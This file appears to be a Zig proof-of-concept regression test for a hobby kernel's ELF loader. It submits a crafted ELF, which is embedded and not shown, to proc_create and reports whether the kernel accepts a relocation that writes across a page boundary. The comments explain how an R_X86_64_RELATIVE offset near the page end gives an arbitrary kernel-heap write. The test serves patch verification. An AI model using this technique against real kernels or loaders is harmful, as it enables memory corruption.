// PoC for 135a00c: ELF relocation cross-page write.
//
// Pre-patch: applyRelocations performs an 8-byte store via the physmap
// of a resolved page, without checking that the 8 bytes stay inside
// that page. A crafted R_X86_64_RELATIVE with r_offset placing the
// store at page_end - 4 writes 4 bytes into the PHYSICALLY-adjacent
// frame (whatever the PMM allocated next) — an arbitrary kernel-heap
// write. In a Debug build the Zig *u64 alignment check fires first
// and panics the kernel; either way, pre-patch the kernel accepts
// the malformed ELF and then misbehaves.
//
// Post-patch: loadElf rejects the ELF up front with InvalidElf; the
// proc_create syscall returns an error.
//
// Differential: pre-patch proc_create returns a handle >= 0 (and the
// kernel panics mid-load); post-patch proc_create returns a negative
// error value cleanly.

const lib = @import("lib");
const syscall = lib.syscall;
const perms = lib.perms;

const bad_elf align(8) = @embedFile("p1_bad.elf").*;

pub fn main(_: u64) void {
    const rights: u64 = (perms.ProcessRights{ .spawn_thread = true, .spawn_process = true, .mem_reserve = true }).bits();
    const ret = syscall.proc_create(@intFromPtr(&bad_elf), bad_elf.len, rights);

    if (ret >= 0) {
        syscall.write("POC-P1: VULNERABLE (proc_create accepted cross-page reloc)\n");
    } else {
        syscall.write("POC-P1: PATCHED (proc_create rejected malformed ELF)\n");
    }
    syscall.shutdown();
}
